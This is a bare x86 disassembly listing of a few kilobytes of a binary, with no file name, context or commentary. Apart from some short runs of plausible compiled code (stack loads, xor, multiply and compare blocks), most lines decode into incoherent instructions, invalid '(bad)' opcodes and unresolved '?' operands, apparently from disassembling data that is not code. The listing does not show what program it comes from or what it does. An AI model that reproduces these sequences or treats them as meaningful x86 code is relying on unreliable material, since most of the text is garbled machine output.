  40ba79:	add    BYTE PTR [ecx+0x5581bff8],ch
  40ba7f:	mov    WORD PTR [edx+0x7db198c8],?
  40ba85:	jp     0x40ba45
  40ba87:	or     DWORD PTR [esi+0x10],0xf053ab3f
  40ba8e:	jecxz  0x40ba60
  40ba90:	jo     0x40bb05
  40ba92:	es popf 
  40ba94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba95:	dec    ecx
  40ba96:	(bad)  
  40ba97:	xor    DWORD PTR [edi+0x437656cd],ebx
  40ba9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba9f:	cmp    al,0xf9
  40baa1:	dec    ecx
  40baa2:	shl    eax,cl
  40baa4:	repnz cli 
  40baa6:	out    0x8e,al
  40baa8:	add    eax,DWORD PTR [ecx+0x431dc201]
  40baae:	nop
  40baaf:	xchg   ebp,eax
  40bab0:	inc    eax
  40bab1:	ja     0x40bab5
  40bab3:	mov    esp,0x65b8c0d
  40bab8:	jmp    0xb44b:0x6c8af920
  40babf:	in     eax,dx
  40bac0:	pop    ecx
  40bac1:	lea    ebp,[ecx+0x75]
  40bac4:	xor    eax,0x9bfa02b8
  40bac9:	jmp    DWORD PTR [eax+eax*2+0x78]
  40bacd:	jne    0x40bb25
  40bacf:	dec    ecx
  40bad0:	or     BYTE PTR [bp+di],dl
  40bad3:	sub    bl,dh
  40bad5:	iret   
  40bad6:	add    al,0xce
  40bad8:	imul   BYTE PTR ds:0xad97d53c
  40bade:	pushf  
  40badf:	sbb    bl,BYTE PTR [esi-0x4d]
  40bae2:	mov    ?,esp
  40bae4:	or     al,0x2a
  40bae6:	adc    eax,0x2ded99e9
  40baeb:	adc    esi,edx
  40baed:	cld    
  40baee:	sub    ah,BYTE PTR [esi-0x3]
  40baf1:	ins    DWORD PTR es:[edi],dx
  40baf2:	shr    BYTE PTR [edx+eiz*2],0x72
  40baf6:	sub    al,0x7c
  40baf8:	ret    
  40baf9:	cmp    dl,BYTE PTR [esi]
  40bafb:	fwait
  40bafc:	arpl   WORD PTR ds:0x18e6a6bc,cx
  40bb02:	mov    al,0x5b
  40bb04:	add    al,0x21
  40bb06:	or     ch,BYTE PTR [ebp-0x5d]
  40bb09:	mov    bl,0x5b
  40bb0b:	inc    ecx
  40bb0c:	xor    edx,DWORD PTR [ecx-0x68]
  40bb0f:	inc    esp
  40bb10:	cwde   
  40bb11:	pop    edi
  40bb12:	jl     0x40bb1b
  40bb14:	mov    ds,WORD PTR [eax]
  40bb16:	sbb    BYTE PTR ds:0xb8af81ef,dl
  40bb1c:	lods   al,BYTE PTR fs:[esi]
  40bb1e:	jae    0x40baf1
  40bb20:	pop    es
  40bb21:	xlat   BYTE PTR ds:[ebx]
  40bb22:	test   eax,0x9a4a91f8
  40bb27:	ja     0x40bb33
  40bb29:	add    DWORD PTR [ecx+0x444aeb2b],esi
  40bb2f:	pop    esp
  40bb30:	jbe    0x40bba7
  40bb32:	out    dx,eax
  40bb33:	test   BYTE PTR [esi-0x30e66b2c],cl
  40bb39:	mov    dh,0xe4
  40bb3b:	cmp    eax,0xbac9ce90
  40bb40:	cmp    edx,esp
  40bb42:	ret    
  40bb43:	and    cl,BYTE PTR [edx-0x5ff934bf]
  40bb49:	(bad)  
  40bb4a:	iret   
  40bb4b:	stc    
  40bb4c:	std    
  40bb4d:	xchg   ebx,edx
  40bb4f:	pusha  
  40bb50:	aad    0x53
  40bb52:	xchg   edi,eax
  40bb53:	test   al,0xb2
  40bb55:	stos   BYTE PTR es:[edi],al
  40bb56:	push   eax
  40bb57:	rol    DWORD PTR [ebx-0x26],cl
  40bb5a:	mov    edx,0x3d433eee
  40bb5f:	jns    0x40bbb9
  40bb61:	fucom  st(3)
  40bb63:	aam    0xf1
  40bb65:	jl     0x40bb75
  40bb67:	or     eax,0x69d73e11
  40bb6c:	sub    ah,al
  40bb6e:	mov    ecx,0x3111a9a4
  40bb73:	mov    al,0xae
  40bb75:	add    al,0x46
  40bb77:	dec    esi
  40bb78:	and    DWORD PTR [ecx],ecx
  40bb7a:	aad    0xc2
  40bb7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb7d:	push   cs
  40bb7e:	push   ds
  40bb7f:	mov    edx,0x3083470a
  40bb84:	outs   dx,DWORD PTR ds:[esi]
  40bb85:	jnp    0x40bb81
  40bb87:	test   al,0x9a
  40bb89:	fdiv   QWORD PTR fs:[esi]
  40bb8c:	adc    bh,0x5c
  40bb8f:	lods   al,BYTE PTR ds:[esi]
  40bb90:	mov    dh,0x8f
  40bb92:	test   DWORD PTR fs:[ebx-0x20d8a1b6],0xc71f6d0
  40bb9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb9e:	mov    BYTE PTR [eax-0x2391f36e],bh
  40bba4:	in     al,dx
  40bba5:	or     BYTE PTR ds:0x2e6eb4a,bl
  40bbab:	xor    ebx,0x6c
  40bbae:	push   eax
  40bbaf:	mov    WORD PTR [esi-0x76],ds
  40bbb2:	inc    eax
  40bbb3:	(bad)  
  40bbb4:	push   ebx
  40bbb5:	sbb    BYTE PTR [edx+eiz*8+0x49],dh
  40bbb9:	dec    edx
  40bbba:	daa    
  40bbbb:	shl    ebx,0x6d
  40bbbe:	addr16 out dx,eax
  40bbc0:	lods   al,BYTE PTR ds:[esi]
  40bbc1:	sbb    al,0x27
  40bbc3:	test   al,0x86
  40bbc5:	test   BYTE PTR [ebx-0x67],ch
  40bbc8:	sahf   
  40bbc9:	int    0x98
  40bbcb:	test   eax,0x5f81798
  40bbd0:	mov    ch,0x4d
  40bbd2:	ror    DWORD PTR [esi+0xf],1
  40bbd5:	ja     0x40bc51
  40bbd7:	outs   dx,DWORD PTR ds:[esi]
  40bbd8:	sub    eax,0xc2921b03
  40bbdd:	jno    0x40bbd1
  40bbdf:	jbe    0x40bc32
  40bbe1:	xchg   ebp,eax
  40bbe2:	div    al
  40bbe4:	aaa    
  40bbe5:	mov    esi,0x3dc80b4e
  40bbea:	or     al,0xfb
  40bbec:	cmp    al,0x6
  40bbee:	test   edi,edx
  40bbf0:	jecxz  0x40bb73
  40bbf2:	or     BYTE PTR [ebx-0x8],ah
  40bbf5:	ja     0x40bb79
  40bbf7:	xor    DWORD PTR [ecx+edx*2-0x32159eeb],edi
  40bbfe:	cld    
  40bbff:	leave  
  40bc00:	push   ds
  40bc01:	cmc    
  40bc02:	xor    DWORD PTR [ebp+eiz*8+0x7d244618],edx
  40bc09:	jge    0x40bba0
  40bc0b:	inc    edi
  40bc0c:	push   esi
  40bc0d:	mov    gs,WORD PTR [ecx-0x54]
  40bc10:	xchg   ebp,eax
  40bc11:	clc    
  40bc12:	sbb    al,BYTE PTR [esi-0x5d]
  40bc15:	ret    
  40bc16:	aaa    
  40bc17:	mov    ebx,DWORD PTR [eax+0x55]
  40bc1a:	sub    DWORD PTR [edi],edx
  40bc1c:	ds jnp 0x40bc6f
  40bc1f:	mov    dh,0xf4
  40bc21:	dec    ebp
  40bc22:	ss cs out 0x9b,eax
  40bc26:	xor    al,0xf1
  40bc28:	or     DWORD PTR [edx+0x6acae8dd],0x96f47cf8
  40bc32:	jg     0x40bc67
  40bc34:	and    eax,0x12c38a5d
  40bc39:	(bad)  
  40bc3a:	xor    bl,BYTE PTR [esi-0x747b3f32]
  40bc40:	stos   DWORD PTR es:[edi],eax
  40bc41:	xchg   edi,eax
  40bc42:	retf   0x682
  40bc45:	sbb    DWORD PTR [edx+0x777db9a3],eax
  40bc4b:	jns    0x40bc51
  40bc4d:	je     0x40bcb9
  40bc4f:	pop    ecx
  40bc50:	int3   
  40bc51:	ds adc al,0x1f
  40bc54:	push   0x76
  40bc56:	clc    
  40bc57:	(bad)  
  40bc58:	stc    
  40bc59:	xchg   edx,eax
  40bc5a:	mov    esp,0x4d0973b8
  40bc5f:	loop   0x40bc37
  40bc61:	jg     0x40bbf0
  40bc63:	add    ebx,DWORD PTR [edi]
  40bc65:	push   0x2ad477e4
  40bc6a:	add    eax,0x382e21c0
  40bc6f:	jns    0x40bc46
  40bc71:	sbb    eax,0x2fd97bab
  40bc76:	mov    edi,0xc2e252e9
  40bc7b:	sbb    ebp,DWORD PTR [esi-0x633a35ae]
  40bc81:	shl    BYTE PTR [esp+edx*2-0x14],cl
  40bc85:	push   esi
  40bc86:	and    ebp,esi
  40bc88:	push   edi
  40bc89:	or     DWORD PTR [edx+0x23],edx
  40bc8c:	aam    0x12
  40bc8e:	cmp    ecx,DWORD PTR [ebx-0x15c8a0f3]
  40bc94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc95:	jb     0x40bc36
  40bc97:	mov    ds:0x4cc636df,eax
  40bc9c:	mov    edi,ecx
  40bc9e:	sub    eax,0x105a54bc
  40bca3:	shl    DWORD PTR [eax-0x64],0x50
  40bca7:	pop    ds
  40bca8:	addr16 push es
  40bcaa:	sub    eax,0x1633e9a
  40bcaf:	nop
  40bcb0:	(bad)  
  40bcb2:	pop    es
  40bcb3:	xor    al,0xa
  40bcb5:	push   0x5b
  40bcb7:	sti    
  40bcb8:	repnz inc ecx
  40bcba:	mov    dl,0xfe
  40bcbc:	push   ds
  40bcbd:	sar    BYTE PTR [edi+0x36],1
  40bcc0:	and    DWORD PTR [ecx+0x3be8652a],esi
  40bcc6:	(bad)  
  40bcc7:	repz in eax,0xbb
  40bcca:	and    eax,0xcdfe641c
  40bccf:	addr16 push ds
  40bcd1:	in     eax,dx
  40bcd2:	xchg   esp,eax
  40bcd3:	cmp    BYTE PTR ds:0x82d3b74c,dh
  40bcd9:	adc    eax,0xa885c543
  40bcde:	inc    esp
  40bcdf:	jne    0x40bcf1
  40bce1:	retf   
  40bce2:	stos   DWORD PTR es:[edi],eax
  40bce3:	mov    dl,BYTE PTR [edi+0x29]
  40bce6:	ret    
  40bce7:	sbb    BYTE PTR [esi-0x7],0x1e
  40bceb:	pop    es
  40bcec:	jle    0x40bd6c
  40bcee:	add    edx,ecx
  40bcf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcf1:	mov    ebx,0x5d8b81cf
  40bcf6:	lock sub ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    bh,BYTE PTR [edi]
  40bd3f:	(bad)  
  40bd40:	iret   
  40bd41:	ds (bad) 
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bcfb
  40bd4b:	retf   
  40bd4c:	fist   DWORD PTR [ebx]
  40bd4e:	mov    bl,0xf
  40bd50:	or     eax,0xdd4fab2c
  40bd55:	fst    QWORD PTR [ecx+0x62621453]
  40bd5b:	jae    0x40bcfc
  40bd5d:	push   ss
  40bd5e:	mov    bl,0xaf
  40bd60:	ret    
  40bd61:	inc    esp
  40bd62:	rol    BYTE PTR [ebx+0x6ad91cd],cl
  40bd68:	sbb    al,dh
  40bd6a:	(bad)  
  40bd6b:	push   ss
  40bd6c:	(bad)  
  40bd6d:	(bad)  
  40bd6e:	je     0x40bd3a
  40bd70:	aas    
  40bd71:	jecxz  0x40bd75
  40bd73:	or     DWORD PTR ds:0x139f593a,ecx
  40bd79:	xchg   ebp,eax
  40bd7a:	xchg   edx,eax
  40bd7b:	push   es
  40bd7c:	inc    esi
  40bd7d:	xor    DWORD PTR [ebx-0x5ea82c0b],esi
  40bd83:	fxch   st(3)
  40bd85:	test   dh,0xe5
  40bd88:	sbb    cl,BYTE PTR [edi+0x29088c1c]
  40bd8e:	sbb    ch,BYTE PTR [ebp+0x1]
  40bd91:	cmp    eax,0x7b53acea
  40bd96:	jbe    0x40bd49
  40bd98:	(bad)
  40bd9b:	mov    dh,0x12
  40bd9d:	pop    ecx
  40bd9e:	cwde   
  40bd9f:	jns    0x40bddf
  40bda1:	push   edi
  40bda2:	and    esi,DWORD PTR [edi-0x14]
  40bda5:	inc    ecx
  40bda6:	lahf   
  40bda7:	fstp   TBYTE PTR [edx-0x2571f446]
  40bdad:	fst    QWORD PTR [esi+0x48]
  40bdb0:	arpl   WORD PTR [edi+0x2d],si
  40bdb3:	adc    DWORD PTR [ebp+0x3819fe37],ecx
  40bdb9:	dec    esp
  40bdba:	push   esi
  40bdbb:	stos   DWORD PTR es:[edi],eax
  40bdbc:	mov    esi,0x9d5bb996
  40bdc1:	outs   dx,DWORD PTR ds:[esi]
  40bdc2:	jmp    0xfde4:0x2ef20443
  40bdc9:	ret    
  40bdca:	add    BYTE PTR [ecx+0x7741bd66],dl
  40bdd0:	lods   eax,DWORD PTR ds:[esi]
  40bdd1:	ror    DWORD PTR [ecx+0x4df5eb4d],cl
  40bdd7:	fistp  WORD PTR [ebp+0x4660fb8b]
  40bddd:	(bad)  
  40bdde:	cld    
  40bddf:	and    ebp,DWORD PTR [ecx*8+0x69848d23]
  40bde6:	adc    ebp,DWORD PTR [eax*4+0x67da30e2]
  40bded:	fwait
  40bdee:	stos   BYTE PTR es:[edi],al
  40bdef:	mov    ah,0xc8
  40bdf1:	lock rcr DWORD PTR [ecx+0x27475657],1
  40bdf8:	imul   eax,DWORD PTR [esi],0xffffffe6
  40bdfb:	cmp    eax,0x9ede60b3
  40be00:	sub    DWORD PTR [esi+0x6d17d45],ebp
  40be06:	mov    ebx,DWORD PTR [edx-0x43]
  40be09:	ja     0x40bdd9
  40be0b:	push   edi
  40be0c:	push   0xffffffc3
  40be0e:	pop    edx
  40be0f:	sub    eax,0x367e1266
  40be14:	push   eax
  40be15:	dec    ecx
  40be16:	add    ah,BYTE PTR [esi]
  40be18:	aas    
  40be19:	jns    0x40be5c
  40be1b:	ins    DWORD PTR es:[edi],dx
  40be1c:	das    
  40be1d:	imul   ebp,ecx,0xe1536bb
  40be23:	in     al,0x30
  40be25:	and    BYTE PTR [eax],0xb2
  40be28:	lods   eax,DWORD PTR ds:[esi]
  40be29:	sti    
  40be2a:	adc    eax,0x76fee6c5
  40be2f:	(bad)  
  40be30:	and    DWORD PTR [ebp+0x3b44541a],edi
  40be36:	dec    eax
  40be37:	adc    ebx,edx
  40be39:	push   ebp
  40be3a:	lea    esi,[esp+edi*1-0x7973cfdc]
  40be41:	inc    esi
  40be42:	in     eax,dx
  40be43:	xchg   ebp,eax
  40be44:	mov    esp,0x65956dfd
  40be49:	pop    edi
  40be4a:	xor    ah,BYTE PTR fs:[ecx-0x2d68556e]
  40be51:	jmp    0xf0f83e6f
  40be56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be57:	pop    ebp
  40be58:	in     eax,dx
  40be59:	ins    BYTE PTR es:[edi],dx
  40be5a:	jno    0x40be60
  40be5c:	(bad)  
  40be5d:	adc    DWORD PTR [esi],edx
  40be5f:	pop    es
  40be60:	mov    esi,0xab97635b
  40be65:	inc    di
  40be67:	nop
  40be68:	test   al,0x82
  40be6a:	or     BYTE PTR [ebx-0x4],bl
  40be6d:	retf   0xe354
  40be70:	push   ecx
  40be71:	dec    edi
  40be72:	jnp    0x40be92
  40be74:	xlat   BYTE PTR ds:[ebx]
  40be75:	call   DWORD PTR [edi+0x3a]
  40be78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be79:	loope  0x40be4a
  40be7b:	cmp    BYTE PTR [esi+0x38],ah
  40be7e:	hlt    
  40be7f:	cmc    
  40be80:	in     eax,0xe0
  40be82:	fiadd  WORD PTR [ebx+0x37]
  40be85:	mov    dl,0x61
  40be87:	lods   eax,DWORD PTR ds:[esi]
  40be88:	jb     0x40bedf
  40be8a:	fld    DWORD PTR [eax-0x15d93957]
  40be90:	or     DWORD PTR [esi+0x519710fc],esp
  40be96:	enter  0xcc73,0xdf
  40be9a:	xor    eax,0x35cb39f0
  40be9f:	mov    cl,0x62
  40bea1:	ins    DWORD PTR es:[edi],dx
  40bea2:	mov    BYTE PTR [edx],ch
  40bea4:	push   eax
  40bea5:	stos   BYTE PTR es:[edi],al
  40bea6:	or     DWORD PTR ds:0x356d283d,esi
  40beac:	rcr    eax,1
  40beae:	(bad)  
  40beaf:	cdq    
  40beb0:	jl     0x40bec2
  40beb2:	cli    
  40beb3:	jb     0x40bf2e
  40beb5:	jne    0x40be6c
  40beb7:	pusha  
  40beb8:	std    
  40beb9:	mov    ah,0x6c
  40bebb:	pushf  
  40bebc:	mov    ds:0x59638c89,al
  40bec1:	loopne 0x40bebf
  40bec3:	test   BYTE PTR [edi],bl
  40bec5:	mov    ?,WORD PTR [ebp+0x3]
  40bec8:	inc    ecx
  40bec9:	and    bh,BYTE PTR [ebp+0x65]
  40becc:	jmp    FWORD PTR ds:0x8ad1cb42
  40bed2:	mov    dh,0x46
  40bed4:	push   ss
  40bed5:	and    cl,cl
  40bed7:	in     eax,0xb2
  40bed9:	push   0xeb279c97
  40bede:	jno    0x40bf56
  40bee0:	fld    TBYTE PTR [edi]
  40bee2:	cmp    DWORD PTR [edx-0x34],esi
  40bee5:	mov    cs,WORD PTR [esi-0x3a]
  40bee8:	xchg   DWORD PTR [edx-0x10],eax
  40beeb:	(bad)  
  40beec:	jge    0x40beca
  40beee:	rcr    DWORD PTR ds:0x376da883,0x51
  40bef5:	rol    DWORD PTR [ebx],cl
  40bef7:	mov    ds:0x8b3314bd,eax
  40befc:	mov    WORD PTR [ebp+0x4],ss
  40beff:	xchg   esp,eax
  40bf00:	and    BYTE PTR [ebx+0x46b85797],bl
  40bf06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf07:	add    al,0xb2
  40bf09:	popa   
  40bf0a:	ret    0x8c07
  40bf0d:	push   edx
  40bf0e:	jg     0x40bef1
  40bf10:	test   al,0x5b
  40bf12:	iret   
  40bf13:	and    edx,ebp
  40bf15:	and    BYTE PTR [esi+0x44],0xba
  40bf19:	pop    ds
  40bf1a:	(bad)  
  40bf1b:	jecxz  0x40beb5
  40bf1d:	retf   
  40bf1e:	out    0x8,eax
  40bf20:	mov    cl,cl
  40bf22:	push   0xeffe4e3c
  40bf27:	xor    al,0x63
  40bf29:	adc    esp,ecx
  40bf2b:	sti    
  40bf2c:	dec    ecx
  40bf2d:	repnz cld 
  40bf2f:	ins    BYTE PTR es:[edi],dx
  40bf30:	inc    eax
  40bf31:	mov    esi,0xb8d0fa30
  40bf36:	mov    ds:0xaf9f90e,al
  40bf3b:	mov    edx,0x539b11c
  40bf40:	push   cs
  40bf41:	ret    0x9871
  40bf44:	sbb    eax,0x759e5f4
  40bf49:	std    
  40bf4a:	mov    ch,0x76
  40bf4c:	aas    
  40bf4d:	adc    esp,DWORD PTR [edi+0xa93f664]
  40bf53:	pop    edi
  40bf54:	mov    edi,0x684eaf54
  40bf59:	mov    ds:0xf43165a0,eax
  40bf5e:	inc    eax
  40bf5f:	in     eax,dx
  40bf60:	xchg   esi,eax
  40bf61:	cmpxchg BYTE PTR [ebp+0x7],al
  40bf65:	int    0x40
  40bf67:	dec    esp
  40bf68:	dec    eax
  40bf69:	pop    ss
  40bf6a:	paddusw mm3,QWORD PTR [esp+0x12]
  40bf6f:	mov    ch,0x76
  40bf71:	xor    al,0x1c
  40bf73:	cmp    eax,0x912915ea
  40bf78:	aam    0xcf
  40bf7a:	pop    ecx
  40bf7b:	psraw  mm5,QWORD PTR [esi]
  40bf7e:	ins    DWORD PTR es:[edi],dx
  40bf7f:	mov    dl,0x58
  40bf81:	rol    BYTE PTR [esi+0x1704ef65],cl
  40bf87:	test   DWORD PTR [ebx-0x4d],0x11e145d9
  40bf8e:	cmp    eax,esp
  40bf90:	fldcw  WORD PTR [ecx]
  40bf92:	jb     0x40bf28
  40bf94:	push   edi
  40bf95:	stc    
  40bf96:	sbb    al,BYTE PTR ds:0x99edc21b
  40bf9c:	push   cs
  40bf9d:	(bad)  [ebx+0x4b6dcda6]
  40bfa3:	idiv   BYTE PTR [edx-0x32]
  40bfa6:	rcr    esp,1
  40bfa8:	repnz fwait
  40bfaa:	ja     0x40bf7a
  40bfac:	add    edx,DWORD PTR [edx-0x1d6b9434]
  40bfb2:	in     al,0x47
  40bfb4:	mov    edx,0xd133610e
  40bfb9:	push   0x79f818a0
  40bfbe:	rcl    BYTE PTR [eax+0x4f],0xdb
  40bfc2:	inc    eax
  40bfc3:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfc5:	sahf   
  40bfc6:	ja     0x40bfc6
  40bfc8:	xor    eax,0x2cad2719
  40bfcd:	std    
  40bfce:	cmp    DWORD PTR [edi-0x113fe91d],0x45f236da
  40bfd8:	js     0x40bf6c
  40bfda:	pop    es
  40bfdb:	dec    eax
  40bfdc:	les    esp,FWORD PTR [edi+0x5691af1f]
  40bfe2:	pop    es
  40bfe3:	ret    
  40bfe4:	aas    
  40bfe5:	mov    edi,0x65c13819
  40bfea:	sbb    edi,DWORD PTR [ebp+ebx*4+0x2e]
  40bfee:	js     0x40bffe
  40bff0:	mov    esi,0xb5a6cb69
  40bff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bff6:	mov    edi,0x2cee2de4
  40bffb:	mov    edi,0x758abc05
  40c000:	lods   al,BYTE PTR ds:[esi]
  40c001:	in     al,dx
  40c002:	push   es
  40c003:	das    
  40c004:	cmp    DWORD PTR [ebx],0xf49f809a
  40c00a:	cwde   
  40c00b:	js     0x40bffc
  40c00d:	(bad)  
  40c00e:	outs   dx,DWORD PTR ds:[esi]
  40c00f:	add    ah,ah
  40c011:	cmp    DWORD PTR [esi-0xa5239ea],esi
  40c017:	jmp    0x40bfa8
  40c019:	and    eax,0xff42e7e2
  40c01e:	arpl   WORD PTR [esi+0x62],bp
  40c021:	sub    al,0xe0
  40c023:	pop    esi
  40c024:	add    esi,edi
  40c026:	jae    0x40bfea
  40c028:	jle    0x40c02d
  40c02a:	stos   BYTE PTR es:[edi],al
  40c02b:	add    ecx,edi
  40c02d:	ja     0x40c01e
  40c02f:	xchg   ecx,eax
  40c030:	mov    edi,eax
  40c032:	push   edi
  40c033:	sbb    eax,0xa56b7702
  40c038:	hlt    
  40c039:	stos   DWORD PTR es:[edi],eax
  40c03a:	xchg   edi,eax
  40c03b:	mov    esi,0xe8697608
  40c040:	xor    BYTE PTR [ecx+0x39],ch
  40c043:	out    0xfc,al
  40c045:	sbb    ch,BYTE PTR [eax+0x173a4887]
  40c04b:	(bad)  
  40c04c:	fistp  QWORD PTR [eax+0x2547efe0]
  40c052:	bound  edx,QWORD PTR [ecx+0x2f80fb97]
  40c058:	and    esp,DWORD PTR [ecx-0x67]
  40c05b:	jp     0x40c001
  40c05d:	sub    BYTE PTR [esi-0x775012b6],0xc4
  40c064:	push   edx
  40c065:	aad    0x9c
  40c067:	cdq    
  40c068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c069:	adc    edx,ebx
  40c06b:	push   edx
  40c06c:	jge    0x40c0d6
  40c06e:	push   esi
  40c06f:	push   esi
  40c070:	dec    esi
  40c071:	adc    al,BYTE PTR [ebp-0x1952c828]
  40c077:	lods   eax,DWORD PTR ds:[esi]
  40c078:	adc    DWORD PTR [ebp+0x2ead4dd5],esp
  40c07e:	ins    DWORD PTR es:[edi],dx
  40c07f:	ficom  DWORD PTR [edi]
  40c081:	bound  ebx,QWORD PTR [ebx]
  40c083:	das    
  40c084:	lods   eax,DWORD PTR ds:[esi]
  40c085:	rcr    BYTE PTR [ebx-0x702c3b51],0xf1
  40c08c:	or     eax,0xb811b43f
  40c091:	or     eax,DWORD PTR [edx+0x4f2b6ee9]
  40c097:	dec    esp
  40c098:	fisubr DWORD PTR [ebx-0x39e55c81]
  40c09e:	adc    bl,BYTE PTR [esi]
  40c0a0:	or     al,0xe2
  40c0a2:	out    0xb3,eax
  40c0a4:	sbb    al,0xde
  40c0a6:	and    DWORD PTR [ecx-0x23],edx
  40c0a9:	rcr    DWORD PTR [ebx-0x79c4daff],0x1c
  40c0b0:	loopne 0x40c089
  40c0b2:	imul   edi,edx,0x6d0740ec
  40c0b8:	loope  0x40c0a9
  40c0ba:	sub    dl,BYTE PTR [esi+0x340150cb]
  40c0c0:	xlat   BYTE PTR ds:[ebx]
  40c0c1:	bound  ecx,QWORD PTR [edi+0x4a3e2fbf]
  40c0c7:	fmulp  st(6),st
  40c0c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0ca:	sbb    ebp,DWORD PTR [esi+0x67]
  40c0cd:	add    bh,bl
  40c0cf:	xor    cl,ch
  40c0d1:	(bad)  
  40c0d3:	sbb    eax,0x1877bc00
  40c0d8:	and    dl,0x24
  40c0db:	ins    BYTE PTR es:[edi],dx
  40c0dc:	sahf   
  40c0dd:	and    edx,edi
  40c0df:	sub    eax,0x676d96a7
  40c0e4:	inc    esi
  40c0e5:	xchg   ecx,eax
  40c0e6:	mov    cl,0x54
  40c0e8:	mov    edx,0x558b6a89
  40c0ed:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    ax,WORD PTR ds:[esp+eax*2+0x7c]
  40c146:	dec    esp
  40c147:	mov    esi,DWORD PTR cs:[eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c169
  40c150:	fwait
  40c151:	dec    ebx
  40c152:	icebp  
  40c153:	rol    ecx,cl
  40c155:	mov    esp,0xd9e95daa
  40c15a:	xchg   edi,eax
  40c15b:	sub    DWORD PTR [eax+0x9],0x47
  40c15f:	pusha  
  40c160:	(bad)  
  40c161:	hlt    
  40c162:	mov    eax,ds:0x20aedb51
  40c167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c168:	mov    ah,0xaf
  40c16a:	jo     0x40c0ee
  40c16c:	push   edi
  40c16d:	sti    
  40c16e:	arpl   WORD PTR [ecx+0x63],si
  40c171:	test   WORD PTR [edx-0x16],ax
  40c175:	xchg   ebx,eax
  40c176:	adc    eax,0x85e3972f
  40c17b:	or     ecx,DWORD PTR [esi]
  40c17d:	xchg   edx,eax
  40c17e:	mov    edx,0x69a85b42
  40c183:	or     dh,BYTE PTR [edx]
  40c185:	xor    BYTE PTR [ebx-0xd436a51],ch
  40c18b:	xor    dh,BYTE PTR [edx+ecx*1]
  40c18e:	stos   DWORD PTR es:[edi],eax
  40c18f:	xchg   edi,eax
  40c190:	shl    DWORD PTR [ecx],0x61
  40c193:	push   esi
  40c194:	push   es
  40c195:	cmp    ebx,edi
  40c197:	cmp    al,0x33
  40c199:	mov    cl,0x8f
  40c19b:	push   0x482ed199
  40c1a0:	sub    ebx,DWORD PTR cs:[edx+eiz*8+0x75]
  40c1a5:	xor    dh,BYTE PTR [eax+0x663677f0]
  40c1ab:	sub    bl,BYTE PTR [ebp-0x11]
  40c1ae:	mov    ch,0x7d
  40c1b0:	(bad)  
  40c1b1:	and    eax,0x58e01e10
  40c1b6:	jge    0x40c1fc
  40c1b8:	sub    DWORD PTR [edx+0x4ce2ff4e],ebx
  40c1be:	das    
  40c1bf:	hlt    
  40c1c0:	xor    eax,0xa5d48ee2
  40c1c5:	xor    eax,0x8b101863
  40c1ca:	sub    eax,0xe2a36140
  40c1cf:	push   ss
  40c1d0:	(bad)  
  40c1d1:	(bad)  
  40c1d2:	inc    ebx
  40c1d3:	sub    al,0xf2
  40c1d5:	mov    ebx,0x45652a62
  40c1da:	sti    
  40c1db:	or     al,0xaf
  40c1dd:	pop    ebx
  40c1de:	xor    eax,DWORD PTR [edx-0x6]
  40c1e1:	test   DWORD PTR ds:0x5db51f54,esp
  40c1e7:	mov    ?,WORD PTR [ebx-0x1]
  40c1ea:	stos   BYTE PTR es:[edi],al
  40c1eb:	leave  
  40c1ec:	adc    ecx,DWORD PTR [edx-0x53c032ea]
